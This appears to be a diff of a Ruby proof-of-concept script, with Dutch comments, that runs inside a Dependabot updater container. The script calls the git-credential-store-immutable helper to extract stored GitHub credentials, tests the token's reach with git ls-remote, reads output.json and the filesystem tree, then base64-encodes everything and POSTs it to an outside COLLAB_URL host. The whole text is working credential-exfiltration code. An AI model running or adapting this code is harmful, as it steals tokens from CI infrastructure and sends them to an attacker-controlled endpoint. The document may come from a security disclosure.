@@ -9,47 +9,55 @@ begin
 
   results = []
 
-  # api_client.rb - hoe werkt de auth zonder DEPENDABOT_JOB_TOKEN?
-  results << "=== api_client.rb ===\n#{read_file.('/home/dependabot/dependabot-updater/lib/dependabot/api_client.rb')}"
-
-  # /home/dependabot/bin/ - alle binaries
+  # /home/dependabot/common/ verkennen
   begin
-    bin_list = `ls -la /home/dependabot/bin/ 2>&1`
-    results << "=== /home/dependabot/bin/ ===\n#{bin_list}"
+    common_tree = `find /home/dependabot/common -maxdepth 4 2>/dev/null`
+    results << "=== /home/dependabot/common/ TREE ===\n#{common_tree[0..4000]}"
   rescue; end
 
-  # git-credential-store-immutable direct aanroepen
+  # git-credential-store-immutable op juiste pad
+  cred_helper = "/home/dependabot/common/bin/git-credential-store-immutable"
   store_file = Dir.glob("/home/dependabot/dependabot-updater/*.git.store").first
-  if store_file
+
+  if File.exist?(cred_helper) && store_file
     begin
       out, err, _ = Open3.capture3(
-        "/home/dependabot/bin/git-credential-store-immutable",
-        "--file", store_file, "get",
+        cred_helper, "--file", store_file, "get",
         stdin_data: "protocol=https\nhost=github.com\n\n"
       )
-      results << "=== CRED HELPER OUTPUT ===\n#{out}\nSTDERR: #{err}"
+      results << "=== CRED HELPER get ===\nOUT: #{out}\nERR: #{err}"
     rescue => e
       results << "=== CRED HELPER ERR: #{e.class}: #{e.message} ==="
     end
+  else
+    results << "=== cred_helper exists: #{File.exist?(cred_helper)}, store: #{store_file} ==="
   end
 
-  # Gitconfig aanroepen via git credential fill
+  # git ls-remote via proxy met stored credentials (test scope van de token)
   gitconfig = Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").first
   if gitconfig
     begin
       out, err, _ = Open3.capture3(
-        {"GIT_CONFIG_GLOBAL" => gitconfig},
-        "git", "credential", "fill",
-        stdin_data: "protocol=https\nhost=github.com\n\n"
+        { "GIT_CONFIG_GLOBAL" => gitconfig, "GIT_TERMINAL_PROMPT" => "0" },
+        "/home/dependabot/bin/git", "ls-remote",
+        "--heads", "https://github.com/ugurcanli/testpen",
+        timeout: 10
       )
-      results << "=== GIT CREDENTIAL FILL ===\n#{out}\nSTDERR: #{err}"
+      results << "=== GIT LS-REMOTE ugurcanli/testpen ===\nOUT: #{out[0..500]}\nERR: #{err[0..200]}"
     rescue => e
-      results << "=== GIT CREDENTIAL FILL ERR: #{e.class}: #{e.message} ==="
+      results << "=== GIT LS-REMOTE ERR: #{e.class}: #{e.message} ==="
     end
   end
 
+  # output.json
+  begin
+    results << "=== output.json ===\n#{read_file.('/home/dependabot/dependabot-updater/output/output.json')}"
+  rescue => e
+    results << "=== output.json: #{e.class} ==="
+  end
+
   payload = [results.compact.join("\n\n")].pack("m0")
-  post_uri = URI("#{COLLAB_URL}?poc=apiclient")
+  post_uri = URI("#{COLLAB_URL}?poc=common")
   r = Net::HTTP::Post.new(post_uri)
   r.body = payload
   Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
